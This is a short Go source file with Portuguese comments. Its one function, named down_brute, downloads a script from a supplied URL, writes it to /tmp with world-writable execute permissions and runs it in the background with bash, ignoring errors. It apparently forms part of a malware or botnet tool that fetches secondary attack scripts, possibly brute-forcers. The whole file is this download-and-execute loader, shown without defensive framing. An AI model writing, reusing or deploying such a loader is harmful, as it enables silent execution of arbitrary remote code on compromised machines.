
package main



import (


"net/http"
"io/ioutil"
"os/exec"
)





func  down_brute( link   string,  name_script string){  //funcao para abaixa sripts  secundarios



//function no critical



cli := http.Client{}


resp , err_get := cli.Get( link )


 if err_get != nil {


  //erro no github.com 

          return


   }



script  , err_readall :=  ioutil.ReadAll(resp.Body) 

   if err_readall  != nil  {


       //"erro em readall"


           return


            }





ioutil.WriteFile("/tmp/" + name_script ,  script , 0777 )


brute :=  exec.Command("sh" , "-c" , " cd /tmp/    ;   bash " +  name_script )

 
brute.Start()


}















